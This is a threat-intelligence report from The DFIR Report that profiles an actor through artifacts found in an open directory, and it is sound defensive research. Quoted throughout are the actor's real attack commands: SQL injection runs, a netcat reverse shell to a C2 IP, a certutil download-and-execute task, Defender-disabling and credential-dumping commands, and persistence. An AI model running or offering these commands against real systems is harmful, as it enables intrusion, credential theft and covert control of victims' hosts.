---
title: "Lets Open(Dir) Some Presents: An Analysis of a Persistent Actor’s Activity - The DFIR Report"
source_url: "https://thedfirreport.com/2023/12/18/lets-opendir-some-presents-an-analysis-of-a-persistent-actors-activity/"
published: "2023-12-18T01:06:14+00:00"
author: "editor"
archived_at: "2026-08-25"
source_html: "2023-12-18_lets-opendir-some-presents-an-analysis-of-a-persistent-actors-activity.html"
---

# Lets Open(Dir) Some Presents: An Analysis of a Persistent Actor’s Activity - The DFIR Report
This report is a little different than our typical content. We were able to analyze data from a perspective we typically don’t get to see… a threat actor’s host! In early November, we came across an open directory that included more than a year of historical threat actor activity. By analyzing tools, logs and artifacts left open to the internet, we were able to profile the threat actor and their victims.

After analyzing the artifacts we can conclude with moderate confidence that the majority of the threat actor activity conducted was not financially motivated. They routinely scanned for services and vulnerabilities on government services and defense contractors. However, they also demonstrated limited financially motivated behavior’s such as deploying crypto-miners and targeting finance sites.

In this case, we have structured the report around the Diamond Model (Victim, Capability, Adversary, Infrastructure). The threat actor relied solely on open source tools and frameworks. For example, active scanning and reconnaissance was performed using sqlmap and ghauri, and if vulnerable, exploitation was performed. Command and control frameworks such as Metasploit and Sliver were then used for post exploitation activity. Detailed tactics and techniques are discussed in sections below.

Below is a high level timeline of clustered activity based on the observed intentional targeting of various countries, governments, and sectors:

## Services

We offer multiple services including a Threat Feed service which tracks Command and Control frameworks such as Cobalt Strike, Metasploit, Empire, Havoc, etc. More information on this service can be found here .

Our All Intel service includes private reports, exploit events, long term infrastructure tracking, clustering, C2 configs, and other curated intel, including non-public case data.

We’ll be launching a private ruleset soon, if you’d like to get in at a discounted rate for the beta, please Contact Us .

If you are interested in hearing more about our services, or would like to talk about a free trial, please reach out using the Contact Us page. We look forward to hearing from you.

# Analysts

Analysis and reporting by @svch0st, @pcsc0ut & UC1.

# Victims

The threat actor targeted several industry sectors over the period of time we were able to observe, which included:

- Government

- Defense Contractors

- Finance (Banking, Investing and Crypto)

- Critical Infrastructure

- Telecommunications

- Escort Services

- VPS Providers

- Security Companies

- Education

- Media and Political Groups

We noted that the threat actor was persistently targeting the Indian Government and Indian defense contractors for over 10 months between January 2023 to October 2023.

Based on the naming conventions of the target files when conducting nuclei scans, the threat actor grouped their scans into clear targeting. Sometimes these were single domains, others were high level domain names, or full sectors.

Government and Defense

The threat actor took an interest in India and Israel’s Government and Defense Contractors. For example, the below is a sample of initial target domains for the Israeli Government:

They also targeted organizations that contributed to the defense sector for these governments, which included manufacturers of:

- Weapons, ammunition, and missiles

- Military aircraft and vehicles

- Military communication and electronics

- Drones

- ID cards

- Aerospace and satellites

Finance and Cryptocurrency

The threat actor also scanned across Banks and Financial institutions saving the results in target files under “crime” and “cryptz” folders on their host:

Escort Services

The threat actor targeted escort service websites in the same countries they were targeting government infrastructure (i.e. Bangladesh, India and Israel).

A folder “hacking_bad_guys” was left in the nuclei scan outputs. The only targets within this folder were some of the Escort Services domains we observed above:

The threat actor may have targeted these services to collect data on users of these services to leverage it in further campaigns, but no direct data was present to prove this.

Media and Political Groups

Below are some of the political groups and media organizations that were targeted by the threat actor:

- Hizb ut – Tahrir – Islamic fundamentalist organization

- Baloch Republican Party – Banned organisation in Pakistan

- Sindhudesh movement – Sindhudesh Revolutionary Army (SRA)

- Tehreek-e-Jafaria – Shia political party

- Umar Media – Media wing of the Tehrik-i-Taliban

- ФедералПресс (FederalPress) – Pro-Russian media outlet

- Новые Известия (Novye Izvestia) – Russian Tabloid

- Новая газета (Novaya Gazeta) – Russian Independent and government-critical media outlet

- Freedom House – Non-profit think tank

Security Companies

Various cyber security company websites were scanned by the threat actor including Group-IB, Mandiant, Horizon3, Kaspersky, Qualys, and CrowdStrike:

Education

The threat actor also targeted US based schools such as Michigan State University, Massachusetts Institute of Technology, and Harvard. Two Russian schools Lomonosov Moscow State University and HSE University were also among educational institutions targeted.

Telecommunications

We also observed the threat actor scanning telco companies. Targets included companies like Grameenphone and Teletalk (Bangladesh), Jazz (Pakistan), Bezeq and Cellcom (Israel). Vulnerabilities found via nuclei scans include the following list of CVEs:

# Capability

The following section has been broken into the relevant MITRE ATT&CK tactics and techniques.

## Reconnaissance

T1595.001 Active Scanning – Scanning IP Blocks

Using httpx the threat actor conducted large scale scanning across ASNs. The tool httpx aims to identify web services exposed to the internet and fingerprint what is running behind it.
echo "AS4758" |httpx --status-code --tech-detect echo "AS4758" |httpx --status-code --tech-detect echo "AS142501" |httpx --status-code --tech-detect -o 142501 echo "AS17813" |httpx --status-code --tech-detect -o 17813 echo "AS55566" |httpx --status-code --tech-detect -o 55566 echo "AS55566" |httpx --status-code --tech-detect -o 55566.txt echo "AS17813" |httpx --status-code --tech-detect -o 17813.TXT echo "AS4758" |httpx --status-code --tech-detect -proxy socks5://localhost:1080 -o AS4748
The arguments -status-code and -tech-detect display the HTTP status code and technology in use (based on the wappalyzer dataset). One of the saved httpx outputs can be seen below:

T1595.002 Active Scanning – Vulnerability Scanning

The threat actor used nuclei to conduct scanning and software identification. We were able to see this activity from the bash history file:
nuclei -l sept24.txt -o sept24_op.txt -s critical,high nuclei -l sept24.txt -o sept24_op.txt -s medium nuclei -l telco_again_subfinder -o telco_again_subfinder_nuclei_scan -as nuclei -l rac_drdo_il_govnet -o rac_drdo_il_govnet_18-sept-23_op -s critical,high nuclei -l co_nic_gov -o co_nic_gov_proxy_output -s critical -proxy socks5://localhost:1080 torify nuclei -u mossad.gov.il -o mossad.gov.il_new torify nuclei -u shabak.gov.il -o shabak.gov.il_new torify nuclei -l large_scope -o large_scope -s critical,high torify nuclei -l large_scope -o large_scope -as
Below was a sample of the captured outputs of the nuclei scans identifying critical vulnerabilities:

T1595.003 Active Scanning – Wordlist Scanning

Using subfinder , the threat actor identified the subdomains of their targets before scanning further:
subfinder -dL drones -o drone_op -silent
The outputs were saved on the host:

T1596 Search Open Technical Databases

The threat actor used the OWASP tool amass to conduct reconnaissance on their targets using open-source databases and APIs:

We discovered a shodan API key used by the threat actor under configuration files in the open directory:

From the bash history, we can see the threat actor using shodan to search for CVE-2022-42475:
shodan search 'vuln="CVE-2022-42475"' --fields ip_str,port --separator " " | awk '{print $1":"$2}'|tee -a temp123.txt
It is noted that this Shodan key was leaked on Telegram at least as far back as early December of 2022, as well as several other places including Linkedin and Cracked[.]io since then.

##

## Initial Access

T1190 Exploit Public-Facing Application

SQL Injection – The threat actor used sqlmap ( S0225 ) and ghauri to conduct SQL injections attacks on target hosts.

The bash history file recorded the execution of these tools and the commands used:
torify sqlmap -u https://<domain>.gov.bd/admin/manage_user.php?id=1 -v 2 --delay 1.7 --time-sec 13 --tamper space2comment --risk 3 --level 5 --random-agent --no-cast --parse-errors --dbs torify ghauri -u "https://<domain>.<domain>.in/products/all-products?category=CATMAPF0CE" --dbs
Sqlmap output files

Here we can see the admin user, password, email, login date and login time from the admin_login table:

Here the threat actor exfiltrated a list of 179 email addresses from a power company:

Metasploit Exploits

In the Metasploit and Meterpreter history files we observed the following exploit modules used by the threat actor:

exchange_proxylogon_rce – CVE-2021-26855 CVE-2021-27065

php_fpm_rce – CVE-2019-11043

vmware_vcenter_uploadova_rce – CVE-2021-21972

Python Exploits

In the bash history we observed the threat actor leveraging several python CVE exploit scripts:

CVE-2020-14882.py – CVE-2020-14882

CVE-2020-14882 is a pre-authentication remote code execution exploit that targets Oracle WebLogic Servers running on Windows or Linux.

When successful – this exploit creates a shell on the victim system. Logs from the output of the session were found in the root directory. In this session, the threat actor gained nt authority\system access and was observed performing some initial system discovery, as well as using the type command to write out a certificate file matching the name of one of the targets.

CVE-2023-25157.py – CVE-2023-25157

CVE-2023-25157 is a SQL Injection exploit that targets GeoServer OGC Filter servers.

CVE-2023-2982.py – CVE-2023-2982

CVE-2023-2982 is an authentication bypass vulnerability in a WordPress plugin named Miniorange Social Login and Register. We observed the threat actor make a directory named exploits. Then clone this exploit into it, cd into the directory, and attempt to exploit a target.

CVE-2019-9978 – WordPress_remote_code_execution_by_Abu

CVE-2019-9978 is a stored XSS vulnerability found in the Social Warfare plugin for WordPress. We observed the threat actor clone and then execute the exploit against a target.

struts-pwn CVE-2017-5638

CVE-2017-5638 is parameter parsing error in the Content-Type HTTP header in Apache Struts that results in a remote command injection vulnerability.

###

Ghostcat – CVE-2020-1938

CVE-2020-1938 is a file read inclusion vulnerability in Apache Tomcat. You can see below the threat actor again cloned the exploit from GitHub then attempted to exploit the target.

While eight systems were observed vulnerable in the nuclei scan output for this vulnerability – only one was observed being targeted in the bash history:

phpunit.py – CVE-2017-9841

CVE-2017-9841 is an unauthenticated remote command execution vulnerability in PHP Unit.

jexboss – CVE-2015-5317, CVE-2016-3427, CVE-2016-8735, CVE-2017-5638

JexBoss is a tool for testing and exploiting vulnerabilities in JBoss Application Servers. It covers several vulnerabilities and provides the ability to check target lists or networks, as well as exploit vulnerable hosts.

While the bash history only shows indications of the tools being run in file-scan mode (meaning the tools checks for vulnerabilities from a target list provided), additional output spanning an eleven day span was observed.

Further review of the files in the directory indicate the threat actor created a run.py python script to automate the exploitation attempts of of individual targets identified as potentially vulnerability in first file mode scan.

Pulse Secure Exploits

Also found in the exploits folder were two bash scripts that appeared to be exploits for Pulse Secure VPN’s, which have had multiple high risk exploits documented in recent years.

The pulse_secure_file_read.sh is a directory traversal vulnerability that can result in session information being stolen from the firewalls, and possibly reused.

The pulse_secure_2021.sh file, on the other hand, was not a exploit at all. Rather this file was a ‘honeypoc’ as explained in blog by TJ Null and Andy Gill included as a link contained in the file itself. A ‘honeypoc’ is a file released, which purports to be a proof-of-concept exploit for a highly sough after CVE when in reality it is a ruse that includes a canary token, which allows the authors to publish research on the use of publicly available exploits and persons who execute downloaded exploits without reading the source code. Part of the ruse is making the threat actor believe the script has deleted files from the local hard drive:

## Execution

Discussed further in the Command and Control section, the threat actor used multiple frameworks including Metasploit and Sliver. From the bash and Metasploit history we were able to identify the commands for various Metasploit payloads:

Metasploit:
set payload linux/x64/meterpreter/reverse_tcp set lhost 192.169.6.122 set lport 4451 exploit
T1059.003 Windows Command Shell

From the Meterpreter history we observed the shell command used which will give the actor a standard shell on the target system.

T1059.001 PowerShell

Sometimes they would then change to using PowerShell to execute certain commands.

T1204.002 Malicious File

Sliver:

The threat actor generated a number of various Sliver beacons over the time they used the server.
generate --mtls 192.169.6.122 --save /root --os linux generate --mtls 192.169.6.122 --save /root --os windows
We recovered the following beacons for both Windows and Linux:

## Persistence

T1505.003 Server Software Component: Web Shell

The threat actor uploaded a weevely webshell to:
http://<domain>.gov.bd/img_upload/user/ddos.php
Using the session log left behind, we were able to identify the threat actor used the web shell to identify sensitive information on the host:

T1569.002 System Services: Service Execution

The threat actor used Sliver’s execute-assembly to load SharPersist .

The Sliver audit log recorded the arguments provided to SharPersist which were used to create a Windows service called HealthCheck to run encoded PowerShell.

When decoded, we can see this creates a reverse shell:

They also used sc to create a service for a Sliver implant to gain persistence:
sc create winmo displayname=discord binpath=C:\programdata\mdsn\svchost.exe start=auto
T1053.005 Scheduled Task/Job: Scheduled Task

Loaded in the same way as above, SharPersist was used to create a scheduled task also called HealthCheck to run C:\ProgramData\Software\svchost.exe :

T1546.004 Event Triggered Execution: Unix Shell Configuration Modification

The threat actor used Sliver to upload modified versions of .bashrc to compromised hosts and set up a coin miner. We were able to recover the uploaded files and can see the appended lines below:

The referenced autominionlx.sh is downloaded from the Sliver server:

Shortly afterwards, the Sliver implant is used to add a cronjob to execute the script:

Error messages indicate the bash script is related to the execution of xmrig.

These error messages are resolved by the installation of xmrig, and copying the file to the tmp directory under the .atmon name:

Now the victim system is added to the mining pool for the threat actor:

A review of the XMR Monero Mining Payment History shows activity for the XMR address executed by the script:

## Privilege Escalation

T1548 Abuse Elevation Control Mechanism

The threat actor used the built-in Meterpreter getsystem module which uses various techniques to create a payload as SYSTEM.

T1053.005 Scheduled Task/Job: Scheduled Task

During a meterpreter session, the threat actor created a scheduled task to launch a payload as NT AUTHORITY\SYSTEM :
schtasks /create /RL HIGHEST /RU "NT AUTHORITY\SYSTEM" /sc minute /mo 30 /tn "schdsWin" /tr "cmd.exe /C certutil.exe -urlcache -f http://192.169.6.122:6770/svchost.exe %systemdrive%\\Windows\\Temp\\svchost.exe & %systemdrive%\\Windows\\Temp\\svchost.exe" schtasks /run /TN "schdsWin"
T1068 Exploitation for Privilege Escalation

### LinPEAS

For several of the targets, after gaining shell access, we found the threat actor executing LinPEAS to try to discover privilege escalation paths on the exploited host.

Metasploit

From the Metasploit history, we observed the threat actor using various Linux privilege escalation modules:

network_manager_vpnc_username_priv_esc – CVE-2018-10900

ptrace_traceme_pkexec_helper – CVE-2019-13272

cve_2021_4034_pwnkit_lpe_pkexec – CVE-2021-4034

## Defense Evasion

T1562.001 Impair Defenses: Disable or Modify Tools

Various commands were captured in the Meterpreter history disabling Microsoft Defender:
Set-MpPreference -DisableScriptScanning $True Add-MpPreference -ExclusionPath "C:\Windows\Temp" powershell -c iex(Set-MpPreference -DisableRealtimeMonitoring $true) Set-MpPreference -ExclusionProcess "explorer.exe", "cmd.exe", "powershell.exe" REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection /v EnableLUA New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
T1036 Masquerading

T1036.004 Masquerade Task or Service

The threat actor used various masquerading naming conventions to try and blend-in on systems to which they gained access. These techniques were applied to Silver beacons, naming of tasks, and service names.

Masquerading beacon examples:

Masquerading service example:
sc create winmo displayname=discord binpath=C:\programdata\mdsn\svchost.exe start=auto

## Credential Access

The threat actor used various techniques to access hashes and credentials of the target hosts.

T1003.002 OS Credential Dumping: Security Account Manager

Meterpreter History:
load kiwi creds_all lsa_dump_sam lsa_dump_secrets creds_livessp hashdump
T1003.003 OS Credential Dumping: NTDS

During a compromise of a host with Sliver, they used the download command to pull back the ntds.dit from the target:
.sliver / logs / audit.json:{ "level" : "info" , "msg" : "{\"request\":\"{\\\"Path\\\":\\\"ntds.dit\\\",\\\"Request\\\":{\\\"Timeout\\\":60000000000,\\\"SessionID\\\":\\\"<REDACTED>\\\"}}\",\"method\":\"/rpcpb.SliverRPC/Download\"}" , "time" : "2022-10-11T17:52:30Z" }
T1003.006 OS Credential Dumping: DCSync

Meterpreter History:
dcsync_ntlm <domain> \ <user>
T1558.001 Steal or Forge Kerberos Tickets: Golden Ticket

Meterpreter History:
golden_ticket_create
T1552.001 Unsecured Credentials: Credentials In Files

The threat actor used the PowerView module Find-InterestingDomainShareFile to search for password files:
Find-InterestingDomainShareFile -Include *passwords*
T1552.004 – Unsecured Credentials: Private Keys

In one instance the threat actor obtained access with Sliver, they then worked to execute a remote script on the affected host:

A recovered version of this script shows that it uses a clever technique for self propagation on Linux. In addition to disabling UFW and killing several running services, the script then turns to enumerating all the private keys stored on the hosts, parsing all the hosts in the known_hosts files, as well as username associated with any keys found.

This information is then used to iterate through each possible combination of enumerated users, hosts, and keys to attempt to move laterally by using SSH to remotely execute the same script on any connections that might be successful.

The script and IP serving infrastructure used here have been linked to a botnet referred to as the Sysrv-Hello botnet . This has been noted in various campaigns since at least 2021:

https://blogs.juniper.net/en-us/threat-research/sysrv-botnet-expands-and-gains-persistence

https://www.lacework.com/blog/sysrv-hello-expands-infrastructure/

https://sysdig.com/blog/crypto-sysrv-hello-wordpress/

https://darktrace.com/blog/worm-like-propagation-of-sysrv-hello-crypto-jacking-botnet

## Discovery

T1087.001 Account Discovery: Local Account

T1087.002 Account Discovery: Domain Account

T1615 Group Policy Discovery

T1083 File and Directory Discovery

T1069.001 Permission Groups Discovery: Local Groups

T1069.002 Permission Groups Discovery: Domain Groups

In one instance, the threat actor used certutil to download PowerView to run various discovery commands. Below are some of the commands captured in Meterpreter history. The threat actor needed to output the commands to a public location served on an Exchange server to retrieve the results.
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 powershellintelmodule.ps1 Import-Module C:\windows\system32\powershellintelmodule.psm1 Get-Domain Get-DomainSID Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess Get-DomainPolicy | Select-Object -ExpandProperty KerberosPolicy Get-DomainController Get-DomainPolicy Get-DomainController -Domain <domain> Get-DomainUser Get-DomainUser | Out-File -FilePath .\DomainUsers.txt Copy-Item -Path "C:\Windows\System32\DomainUsers.txt" -Destination "C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\syslog.txt Get-DomainUser -Identity Administrator -Properties DisplayName, MemberOf | Format-List Find-DomainUserLocation -Domain Exchange | Select-Object UserName, SessionFromName Get-DomainComputer -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName Get-DomainComputer -Ping -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName Get-DomainGroup | Out-File -FilePath .\intelwind.txt Copy-Item -Path "C:\windows\system32\intelwind.txt" -Destination "C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\systlog.txt" Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName Find-DomainShare Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName Get-NetLocalGroupMember -GroupName Administrators | Select-Object MemberName, IsGroup, IsDomain Get-DomainGPO -Properties DisplayName | Sort-Object -Property DisplayName Get-DomainOU -Properties Name | Sort-Object -Property Name Get-DomaiObjectAcl -Identity ExchangeAD -ResolveGUIDs Find-InterestingDomainAcl -ResolveGUIDs
T1016 System Network Configuration Discovery

T1082 System Information Discovery

T1033 System Owner/User Discovery

In another compromised host, we saw other common commands we observe to gain situational awareness in the environment.
ipconfig echo %logonserver% net user /domain hostname whoami
Other discovery commands used through Meterpreter include the following:
systeminfo
reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions" /s
netstat -ano
ipconfig
adPEAS

While using Sliver, the threat actor executed invoke-adPEAS at least twice:
powershell -c Invoke-adPEAS
While using Sliver, the most used command was “net user /domain” followed by “net user”:
"net user /domain"
"net user"
Other discovery commands that were used by the threat actor while using Sliver include the following:
powershell -c Get-Service
arp -a
powershell -c (Get-WMIObject -class Win32_ComputerSystem)
powershell -c Get-Domain
powershell -c echo %UERNAME%
sc query
run wmic service get name , pathname
powershell.exe -c (Get-Domain)
powershell -c (Invoke-adPEAS -Domain REDACTED.local)
powershell -c (Get-WMIObject)
net group Domain Admins /domain
echo %user%
arp -aon

## Command and Control

Meterpreter

Meterpreter history included the following PowerShell reverse shell:

This shell is the same that was documented in:

https://gist.github.com/dwisiswant0/9b5e78217e810e1efc5d73b3bdef8957

From the Meterpreter history, we can see the following commands were used:
set payload payload/cmd/windows/powershell_reverse_tcp
exploit
S0633 – Sliver

Analyzing the local Sliver DB (.sliver/sliver.db), we can extract the C2 endpoint and active implants.

| Last Implant Create Time | Implant C2 Endpoint

| 2023-10-19 17:58:54 | mtls://192.169.6.122

| 2022-12-22 12:00:39 | hxxp://apicalls[.]net

| 2022-08-12 06:21:02 | mtls://104.200.67.3

We can query the beacons table to get a list of the compromised hosts and the associated command and control server endpoint:

In the database we observed 66 beacons connecting to the server. From these connected beacons, we derived the following dwell time statistics.

| Average Dwell Time | Minimum Dwell Time | Maximum Dwell Time | Median Dwell Time

| 12.83 Hours | 0 (failed beacons) | 13 Days | 1.41 minutes

Beacons with a minimum time of zero seconds indicate the the beacon failed, perhaps because the attack was unsuccessful. For other beacons we observed indications that the threat actor was testing the beacon. When reviewing the 66 beacons only 16 of them had an active time of more than five minutes.

The Sliver multiplayer port 31337 is exposed on 192.169.6.122 as seen by Shodan:

In our Threat Intel services tracking the following data was observed. We first picked up the server as hosting a Sliver team server on 2022-11-16. We continued to observe it until 2023-02-13. After that we picked it up again for Sliver activity on 2023-10-09. The server remains active in our dataset through the date of publication.

S0154 – Cobalt Strike

While we didn’t observe the threat actor actively use Cobalt Strike, a copy of v4.7 was found in the opendir. The server logs recorded one login on 10 Apr 2023 from 45.56.162.100 :
04/10 19:46:17 UTC *** neo (45.56.162.100) joined 04/10 19:48:39 UTC *** neo quit
The md5 of the license file cobaltstrike.auth was 0c5ede28df39341763d16961a118625d.

When using the authkey.pub to decrypt the .auth file, the following results were returned:
Key: 1be5be52c6255c33558e8a1cb667cb06 End date: Aug 31 2022 Watermark: 175065ea Version: 47
The watermark associated with the kit is 0x175065ea (391144938) which is associated with cracked versions.

T1572 Protocol Tunneling

The threat actor used the Meterpreter module portfwd to establish a reverse port forward with the C2 IP:
portfwd add -R -p 89474 -l 4453 -L 192.169.6.122
We also observed in the sliver-client.log where they used netcat:
nc -e /bin/bash 104.200.67.3 1608 2 > /dev/null
The tool gost was found in the root of the open directory. While we didn’t observe the use of this tool, it can be used to create a proxy between victim and threat actor.

T1090.003 Multi-hop Proxy

The threat actor regularly made use of torify to proxy activity via the TOR network.

# Adversary

Sliver Operator names

The Sliver database ./.sliver/sliver.db included the names and tokens of the operators on the Sliver server.

# Infrastructure

T1583.001 Acquire Infrastructure – Domains
smilevolume[.]com apicalls[.]net
The domain smilevolume[.]com was registered in December 2021 via NameCheap. The domain apicalls[.]net was registered in September 2022 and is masked.

There were 6 IPs recorded in ./ssh/known_hosts :
166.62.10.138 146.88.26.221 202.70.80.119 103.248.61.184 43.230.203.164 104.200.67.3
Pivoting on the SSH Fingerprint, there are 12 additional IPs matching the search on Shodan:
"d2:da:76:47:70:80:c2:ba:9d:7a:62:36:60:d6:a1:58" port:22

The threat actor established dynamic port forwarding with proxy hosts for multiple tooling.
ssh -N -D 1080 [email protected] ssh -N -D 1080 [email protected] ssh -N -D 1080 [email protected] -p 1080 ssh -N -D 1080 [email protected]
The IP 103.174.104.51 used to proxy traffic is a Mikrotik router in India:

The last entry (as well as another IP observed in the known hosts file) indicate the threat actor was using a SSH VPN service – vpnjantit[.]com to hide some of the traffic. The default SSH username for vpnjantit[.]com is the service login with the “-vpnjantit[.]com” added to the end according to the site’s documentation. This indicates the username used for the vpnjantit[.]com service was ‘pareshraval’.

## Diamond Model

## Indicators

### Atomic
Sliver 104.200.67.3 192.169.6.122 apicalls.net smilevolume.com http://192.169.6.122:6770/svchost.exe C:\Windows\Temp\svchost.exe C:\ProgramData\Software\svchost.exe C:\ProgramData\Software\cmd.exe C:\ProgramData\Mozrilla\bare.exe C:\ProgramData\Mozrilla\adminlevel\svchost.exe C:\Users\<user>\AppData\Local\Temp\help.exe Metasploit 192.169.6.122 PowerView powershellintelmodule.ps1 Mimikatz c:\ProgramData\Software\mimikatz.exe Xmrig setup http://192.169.6.122:6770/.autominionlx.sh http://192.169.6.122:6770/autominion-wx.cmd

### Computed
Sliver Beacons Windows: URGENT_MAKE.exe 7309c37c81beb399085e5c1513e02c2e a63499602d541e2369bf53554aaec66cee0e52eb 176095a18e7be53373486d5883156d435372a0526f759c47069cf3252255bfcf TASTY_IRONCLAD.exe 1059a105e73513b7aadd66784e43d0a2 dccc2e78afacfa826906b9afaa755fefd8c99216 e2d38978b7a7a77223c94cd8e4a65bc95e12142168ff4aec358f42e5e79741f4 SQUARE_OUTLAY.exe a714bdb25fdaba4ab7f56e3263d4787d 4253f4e11a17369409c744756d58ca62724e3352 ba7eb8794a5787510b341e054462cb058e66e61101983cf2c9fa6911f60bb96d SMOOTH_GEORGE.exe b9b78a170352ed23b99cc78782a40efa b15fc89cabd7891164dcb1de826b465c59ea361e 53c2690006f994ec6be5302d765888b5ed885d587255a423a898c5b6e9c92ebb REAL_OIL.exe a9018d5a653d572a4dd8acd1a1da3097 3ab794414e0e54ff70009d4738a87c83620c7ff1 67c6f15d1859282603af717556d26284219432f89fc52200b2bccedb3e844eda MIGHTY_CRADLE.exe fdbc58105321c9edb6de4ed94e12e9c1 4993cea4b319e0635d0de062d0b6a25302cd0617 605ae6e24c2fcfa0addb4b1c3bc247933d5af92fd5ec5c842fa59b28d33a9835 QUALIFIED_SHAKER.exe 82ed4610ba120836185550f6879f5dee 9560d522b604a82e18d55e1efe90b6028fa0de99 b1022d3e58a0318b52feb8aa8048376113ca7596830cb0da750c08f2c8ece583 MANY_DUNGAREES.exe eb1bf5fcd65d86394628a03c0240243e 3f98962d627af1b63bcfbb80afcf4a2457d4a511 bb634bf932937a683ebf002b2a1325e7fe7bfe172e924d2e528de761248b91ec LIVING_UNCLE.exe 83d86de7ad23486f859df673864247f5 1c9a562e92623d7f3212a45859680ce15a88e73e d43d2a71166f6c8bc383047b2c1fbd735c637c6f471b8ab1f5ab9edf08c8c376 COOING_MEASURE.exe 142ac2a09818d3b3ad3dace6374e268c fa149c4744646d0edfce75dcd51f216a988d5af3 c3da9dbbf4b858c46ead6bd37bc5b6f434908c2c8183a00e98e74899b258fc35 CONSTITUTIONAL_TENSION.exe 1e97a4e09f2e5a843cf410c415ce7b73 a59bcd58bf6f7f0fcb639ae227e13d1966c0f2e1 cec8b3b63de641cc62d5a4d51f349bbe335d44434e1a3c9cadb7180d471f8b60 COMBATIVE_COD.exe 814c3a2363b50e30170c9a15d8423fb2 db060ac0b50ea85c9688fb105b27e7da2d626de8 563b7c7d9feb8965b674a6f04d8730525e6bd81b7c198b614b5fbf92c6a9a198 CIRCULAR_OCELOT.exe a1796ee6418f2bdf743e86d76147d6c8 3610f6fa734d2ebe2e2645bd7667d80514dccf32 4f8296cf4ea485cb0b501297b73901828a1f3975b27494fe1e3c69c5034b0756 CENTRAL_DRIVER.exe e6ce2d90c715ad6fa7dc69d1ae7ff3a7 67c19fda1fd847e4f89c50054f7d049073d8d299 335d0c465b6412095f06649cbbc6e34bfe23d68fd1981b1a4e0a9a1d70862b67 CAUTIOUS_ZOO.exe 353a6a41404aaa2bf8dcae39481d68c9 df801018ed0c691ceecb2b043e0efd9465489830 a91ceb91cc290544fe40c2b4aa43ce94347d35c490721af1e097b52aac164486 BARE_PAGODA.exe e16ae7c890b18a1d2e710b26938db959 dc2c4c98141c08dbd6e895ce0e86d71e36f6aee7 583c92f2ce67d1d8df1fcac95c3765faad602509d6a3c9c5638310ddc0673e55 ABSTRACT_DEPTH.exe 70cc83ced02f0148962aef06cec16da4 e7c18a96e51682962e8a53255024148ed469e461 9c3cf65ac44e3c8ebdf93709aed7b742d3c82286d2b0761072349479befed527 Silver Beacons Linux: SORE_SHELTER 639fad542e4efa374e5f9fe0b97706ab 9dffe7878b0cf82f52fefde9c05b376420f6bc13 a9d848b441774a2ab9ab9f79eccb4f878e28294e3a457af7fa0423c20f3d87aa SEPARATE_BANDOLIER e79fab23cbfe7b94d4207a257e75496b d54a84688d172c54027fcd44da0378fddc223682 7d0e49991b9240816873908602cedd42dfa94fae5eaebd6bb5c3eb8ab5674533 SCARY_BALCONY 1f9cbee5bda0394ab14caade812a0c98 54ecadab558e8df44ad5eddf964428dfed110ab6 6d6fb45e6a7da483efab8e6057ae95235e93923b0242162d7dbdfda714754426 SAD_BEGGAR ad5582da06e7bc2a5c3ac28893fdaa99 c9514466f209c1c270f07956cff6ace96e7ffedb e439a389954b60a609a2d4b99b02abf77978f054affd0cb7c17d379efa95c769 POPULAR_GARBAGE 40b81886ef86bee05d27a75815fcdf20 e1e9bcf99afe923e3d7cd7c0f4f8c669824e7144 c1f27115ef35a21b6a3137c04fe359bc00fadc1658a14c4e08f8f8acd06393fc OUTER_PHILOSOPHER b26516a5361146f091318a5aeda49b9e c51e29ab6282adbdb0423503e1032a9b89dab7f2 dbf58e48183bc77a8115d9bf3a48b60f05baed2522220652ca9a44fc800d8532 OPEN_ANESTHESIOLOGY 6edd600969b69ddcea1940d2f39f7e0a afe7bf8c911bc75c94e462239764b105a409cefb 37fd6280b421b47be5323e2fef2635174f1d153bbb993ad920d70ef84a9e52d4 IMMEDIATE_SOFTWARE 43cf618b9d95495d4c5bde3942695688 f4601bc08552a1c74f88462f39c03695a96f3da4 5a586419e0b719f822606bfb87699e2c30ad818d461eb754d72ae108da420709 GLAD_CLOAKROOM dd3e1b98dde31a080fdc967c08e6a198 fc05520b89e8bdcf203bd56505d45623118f0df5 c812dddd8143d7de052034182761752b02f90df174e485ba8294119408b8894c FUTURE_SPUR 2a11a19ba5d7c15e51dddb7695ea32ad ca20ea3fccad9614fe3e31e60098a9564d2d724c b5c4cc2bd69aceeb1fa7aa6538c3248514dc93f7b6d248e1d0f7b2db5ce86674 Other Files: SharPersist.exe e06b24113cab27ff5a1173fa3f9e1615 0895086036ee0b521156ffc561260bcca9716507 e9711f47cf9171f79bf34b342279f6fd9275c8ae65f3eb2c6ebb0b8432ea14f8

## MITRE

Scanning IP Blocks - T1595.001
Vulnerability Scanning - T1595.002
Wordlist Scanning - T1595.003
Search Open Technical Databases - T1596
Exploit Public-Facing Application - T1190
Web Shell - T1505.003
Service Execution - T1569.002
Scheduled Task - T1053.005
Unix Shell Configuration Modification - T1546.004
Abuse Elevation Control Mechanism - T1548
Disable or Modify Tools - T1562.001
Security Account Manager - T1003.002
NTDS - T1003.003
DCSync - T1003.006
Golden Ticket - T1558.001
Credentials in Files - T1081
Private Keys - T1552.004
Domain Account - T1087.002
Local Account - T1087.001
Group Policy Discovery - T1615
File and Directory Discovery - T1083
Local Groups - T1069.001
Domain Groups - T1069.002
System Network Configuration Discovery - T1016
System Information Discovery - T1082
System Owner/User Discovery - T1033
PowerShell - T1059.001
Protocol Tunneling - T1572
Web Protocols - T1071.001
Exfiltration Over C2 Channel - T1041
Resource Hijacking - T1496
Exploitation for Privilege Escalation - T1068
Multi-hop Proxy - T1090.003
Masquerading - T1036
Masquerade Task or Service - T1036.004
Windows Command Shell - T1059.003
Malicious File - T1204.002
Internal case #25559

##### Share this entry

- Share on Facebook

- Share on X

- Share on WhatsApp

- Share on Linkedin

- Share on Reddit

- Share by Mail
